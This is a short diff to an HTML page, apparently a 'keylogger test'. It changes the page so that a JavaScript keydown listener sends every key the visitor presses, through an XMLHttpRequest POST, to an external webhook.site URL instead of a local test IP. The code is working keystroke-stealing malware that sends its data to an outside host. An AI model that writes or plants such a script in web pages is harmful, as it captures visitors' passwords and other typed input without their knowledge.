@@ -3,18 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Keylogger Test</title>
+    <title>Keylogger Test with Webhook</title>
     <script>
+        // Replace this with your Webhook.site URL
+        var webhookUrl = "https://webhook.site/d1f9b56d-4e93-4ec9-83a8-adbad792666d"; // Replace with your Webhook.site URL
+
         // Keylogger-like script that captures keystrokes
         document.addEventListener('keydown', function(event) {
             // Log the captured keystrokes in the browser's console (for testing purposes)
             console.log('Key pressed: ' + event.key);
 
-            // Simulate sending keystrokes to a remote server (malicious behavior)
+            // Send the keystrokes to the Webhook.site URL
             var xhttp = new XMLHttpRequest();
-            xhttp.open("POST", "http://192.168.114.129/keystrokes", true); // Your test IP
+            xhttp.open("POST", webhookUrl, true);
             xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-            xhttp.send("key=" + event.key); // Sends the key to a test server
+            xhttp.send("key=" + event.key); // Sends the key to Webhook.site
         });
     </script>
 </head>
